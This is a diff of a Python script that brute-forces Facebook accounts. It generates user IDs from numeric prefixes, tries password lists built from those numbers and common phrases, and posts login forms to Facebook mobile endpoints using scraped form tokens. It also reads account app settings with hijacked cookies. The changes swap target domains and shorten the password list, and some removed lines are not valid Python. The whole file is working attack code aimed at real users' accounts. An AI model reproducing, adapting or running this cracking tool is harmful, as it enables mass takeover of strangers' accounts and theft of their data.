@@ -79,7 +79,7 @@ oks = []
 cps = []
 loop = 0
 url_lookup = "https://lookup-id.com/"
-url_mb = "https://d.facebook.com"
+url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
 header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
@@ -136,7 +136,7 @@ logo=("""
 \33[1;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
 """)
 def cek_apk(session,coki):
-	w=session.get("https://d.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	w=session.get("https://f.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
 	sop = BeautifulSoup(w,"html.parser")
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
@@ -223,7 +223,7 @@ def RXB ():
 		print(50*'━')
 		for guru in user:
 			uid = kode+koda+kodb+guru
-			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+@#,@kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','freefire','iloveyou']
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode]
 			yaari.submit(b,uid,pwx,tl)
 	print(50*'_')
 	print(' [💉] Crack process has been completed')
@@ -243,7 +243,7 @@ def b(uid,pwx,tl):
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
-            free_fb = session.get('https://d.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -254,7 +254,7 @@ def b(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'd.facebook.com',
+            header_freefb = {'authority': 'm.facebook.com',
             'method': 'GET',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
